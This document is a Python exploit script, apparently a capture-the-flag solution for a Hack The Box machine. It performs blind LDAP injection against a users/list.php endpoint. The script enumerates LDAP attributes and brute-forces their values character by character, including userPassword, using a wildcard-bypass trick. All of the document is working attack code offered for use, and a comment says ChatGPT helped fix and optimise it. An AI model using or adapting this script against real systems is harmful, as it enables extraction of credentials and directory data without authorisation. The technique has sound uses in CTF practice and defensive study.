#!/usr/bin/python3
# 90% of this code was made by v0lk3n
# But i asked ChatGPT to fix an error for the last bruteforce step
# And finaly asked ChatGPT to optimize the code to make it better
import sys
import requests
import string
from termcolor import colored

# Constants
URL_BASE = 'http://internal.analysis.htb/users/list.php?name=*)('
SPECIAL_CHARS = "_@{}-/()!*\"$%=^[]:;"
ALPHABET = string.ascii_letters + string.digits + SPECIAL_CHARS

# Function to enumerate attributes
def enumerate_attributes():
    print(colored("\nStarting Attributes Enumeration : \n", 'blue'))
    discovered_attributes = []
    for attribute in ATTRIBUTES:
        r = requests.get(URL_BASE + str(attribute) + "=*")
        sys.stdout.write(colored("Attributes Enumeration Target : ", 'red') + URL_BASE + str(attribute) + f"\r")
        if 'technician' in r.text:
            discovered_attributes.append(str(attribute))
    print(colored("\n\nRecovered Attributes : ", 'green'))
    print(discovered_attributes)
    print("\n")
    return discovered_attributes

# Function to find bruteforcable attributes
def find_bruteforcable_attributes(attributes):
    bruteforcable_attributes = []
    for attribute in attributes:
        for char in ALPHABET:
            r = requests.get(URL_BASE + str(attribute) + "=" + str(char) + "*")
            sys.stdout.write(colored("Looking for bruteforcable attribute : ", 'red') + URL_BASE + str(attribute) + "=" + str(char) + f"\r")
            if 'technician' in r.text:
                bruteforcable_attributes.append(str(attribute))
                break
    print(colored("\n\nFound Bruteforcable Attributes : ", 'green'))
    print(bruteforcable_attributes)
    print("\n")
    return bruteforcable_attributes

# Function to perform LDAP injection
def perform_bruteforce(attributes):
    print(colored("Starting Bruteforcing...\n", 'blue'))
    recovered_data = {}
    for attribute in attributes:
        url = URL_BASE + attribute + '='
        data = ""
        while True:
            valid_char = False
            for char in ALPHABET:
                payload = url + str(char)
                r = requests.get(payload + "*")
                sys.stdout.write(colored("Bruteforcing : ", 'red') + payload + f"\r")
                if 'technician' in r.text:
                    url = payload
                    data += char
                    valid_char = True
                    break
            if not valid_char:
                print(colored("\n\nNo character found, attempting to bypass wildcard...\n", 'yellow'))
                for char in ALPHABET:
                    payload = url + "*" + str(char)
                    r = requests.get(payload + "*")
                    sys.stdout.write(colored("Bypassing wildcard : ", 'red') + payload + f"\r")
                    if 'technician' in r.text:
                        print(colored("\n\nValid special character found, returning to normal bruteforcing...\n", 'yellow'))
                        url = payload
                        data += char
                        valid_char = True
                        break
            if not valid_char:
                print(colored("\n\nNo additional character found for attribute", 'yellow'), attribute)
                break
        print(colored("\n\nRecovered data for attribute", 'green'), attribute + ':', url)
        recovered_data[attribute] = url
    return recovered_data

# Main function
def main():
    discovered_attributes = enumerate_attributes()
    bruteforcable_attributes = find_bruteforcable_attributes(discovered_attributes)
    recovered_data = perform_bruteforce(bruteforcable_attributes)
    return recovered_data

if __name__ == "__main__":
    # List of attributes
    ATTRIBUTES = (
        'accessHint', 'accountHint', 'audio', 'businessCategory', 'c', 'carLicense', 'cn', 'configPtr', 'departmentNumber',
        'description', 'destinationIndicator', 'displayName', 'employeeNumber', 'employeeType', 'facsimileTelephoneNumber',
        'generationQualifier', 'givenName', 'homeFax', 'homePhone', 'initials', 'internationalISDNNumber', 'jpegPhoto', 'l',
        'labeledURI', 'mail', 'manager', 'middleName', 'mobile', 'o', 'objectClass', 'organizationalStatus', 'otherMailbox',
        'ou', 'pager', 'personalTitle', 'photo', 'physicalDeliveryOfficeName', 'postalAddress', 'postalCode', 'postOfficeBox',
        'preferredDeliveryMethod', 'preferredLanguage', 'registeredAddress', 'roomNumber', 'secretary', 'seeAlso', 'sn', 'st',
        'street', 'telephoneNumber', 'teletexTerminalIdentifier', 'telexNumber', 'thumbNailLogo', 'thumbNailPhoto', 'title',
        'uid', 'uniqueIdentifier', 'userCertificate', 'userPKCS12', 'userPassword', 'userSMIMECertificate', 'x121Address', 'x500UniqueIdentifier'
    )
    recovered_data = main()
    print(colored("\nNo more bruteforcable data on the provided arguments list...\n", 'yellow'))
    print(colored("Recovered data for attributes:\n", 'blue'))
    for attribute, value in recovered_data.items():
        print(colored(attribute + ':', 'yellow'), value)
